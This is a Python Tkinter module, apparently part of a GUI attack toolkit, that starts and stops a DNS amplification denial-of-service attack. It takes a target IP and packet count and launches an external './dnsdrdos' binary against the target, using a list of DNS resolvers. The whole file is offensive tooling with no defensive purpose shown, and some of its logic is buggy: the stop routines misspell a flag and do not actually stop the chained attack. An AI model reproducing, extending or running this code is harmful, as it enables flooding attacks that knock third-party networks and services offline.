import threading
import traceback
import subprocess
import signal

from tkinter import *

def startDnsAmplification(targetIp, dnsPackets, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global dnsAmplificationIsRunning, dnsAmplificationThreads, terminalLabel, errorOutputLabel

    dnsAmplificationIsRunning = False
    dnsAmplificationThreads = threading.Thread(target = lambda : sendDnsPackets(targetIp, dnsPackets))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running DNS Amplification Attack...\n\n"

    runDnsAmplification()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopDnsAmplification() :
    global dnsAmplificationThreads, dnsAmplificationIsRunning

    try:
        terminalLabel["text"] += "\n$ Stopping DNS Amplification Attack...\n\n"
        dnsAmplificationIsrunning = False
        dnsAmplificationThreads.join(0)
        dnsAmplificationThreads = None

        process.send_signal(signal.SIGINT)

        terminalLabel["text"] += "$ DNS Amplification Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runDnsAmplification() :
    global dnsAmplificationThreads, dnsAmplificationIsRunning
    dnsAmplificationIsRunning = True
    dnsAmplificationThreads.start()

def sendDnsPackets(targetIp, dnsPackets):
    global process
    terminalLabel["text"] += "$ Target IP : " + targetIp + "\n"
    terminalLabel["text"] += "$ Amount of DNS Packets : " + dnsPackets + "\n"
    process = subprocess.Popen(["./dnsdrdos", "-f", "dnsList.txt", "-s", targetIp, "-l", dnsPackets])

def startDnsAmplificationChain (queue, targetIp, dnsPackets, chainTerminalContentFrame, chainErrorContentFrame) :
    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainTerminalLabel.pack(anchor = NW)
    chainErrorOutputLabel.pack(anchor = NW)

    chainTerminalLabel["text"] += "$ Running DNS Amplification Attack...\n\n"

    dnsAmpChainProcess = subprocess.Popen(["./dnsdrdos", "-f", "dnsList.txt", "-s", targetIp, "-l", dnsPackets])
    queue.put(dnsAmpChainProcess)

def stopDnsAmplificationChain(chainTerminalContentFrame, chainErrorContentFrame) :
    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainTerminalLabel.pack(anchor = NW)
    chainErrorOutputLabel.pack(anchor = NW)

    try:
        chainTerminalLabel["text"] += "\n$ Stopping DNS Amplification Attack...\n\n"
        chainTerminalLabel["text"] += "$ DNS Amplification Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        chainErrorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        chainErrorOutputLabel["text"] += "ERROR : \n" + e + "\n"
    